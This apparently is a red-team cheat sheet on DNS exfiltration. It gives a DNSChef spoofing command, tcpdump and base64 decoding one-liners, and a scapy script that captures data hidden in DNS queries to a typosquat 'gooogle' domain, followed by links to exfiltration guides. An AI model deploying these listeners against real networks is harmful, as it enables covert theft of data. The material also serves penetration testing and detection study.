# DNS

## 01 - [[DNSChef]]

```
$ sudo dnschef --fakedomains <domain>.<tld> --fakeip 127.0.0.1 --interface 0.0.0.0 --logfile dnschef.log
```

## 02 - BIND9

```
$ sudo apt -y install bind9
```

## 03 - Dnsmasq

```
$ sudo apt install dnsmasq
```

## 04 - TCPDump

Monitor port 53

```
$ sudo tcpdump -i <interface> udp port 53
```

Decode results

```
$ echo "<base64_encoded>" | cut -d "." -f1-8 | tr -d "." | base64 -d
```

## 05 - Python Script

```python
try:
	from scapy.all import *
except:
	print("Scapy not found, please install scapy: pip install scapy")

def process_packet(packet):
	if packet.haslayer(DNS):
		domain = packet[DNS][DNSQR].qname.decode('utf-8')
		root_domain = domain.split('.')[1]
		if root_domain.startswith('gooogle'):
			print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=True, end="", sep="")

sniff(iface="eth0", prn=process_packet)
```

---
## References

### ExploitDB

- [ExploitDB: File Transfer Skills in the Red Team Post Penetration Test](https://www.exploit-db.com/docs/english/46515-file-transfer-skills-in-the-red-team-post-penetration-test.pdf)

### Offensive Security

- [Staged Payloads from Kali Linux | PT Phone Home - DNS](https://www.offsec.com/offsec/staged-payloads-from-kalki-linux-pt-phone-hone-dns/)

### FoxGlove Security

- [FoxGlove Security: Downloading Files Through Recursive DNS With Bash (Or PowerShell)](https://breenmachine.blogspot.com/2014/03/downloading-files-through-recursive-dns.html)

### NotSoSecure

- [NotSoSecure: Out of Band Exploitation (OOB) CheatSheet](https://notsosecure.com/out-band-exploitation-oob-cheatsheet)

### hinty

- [hinty: DNS exfiltration of data: step-by-step simple guide](https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/)

### John Woodman

- [John Woodman: Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)](https://john-woodman.com/research/dns-exfiltration-setup/)

### Takshil Patil

- [Takshil Patil: Deploy Self hosted interactsh-server for Blind & Out of Band Testing](https://takshilp.medium.com/oob-blind-testing-using-dns-exfiltration-54bcc004a0fb)

### The Contractor

- [The Contractor: Data-Bouncing - The art of indirect exfiltration.](https://thecontractor.io/data-bouncing/)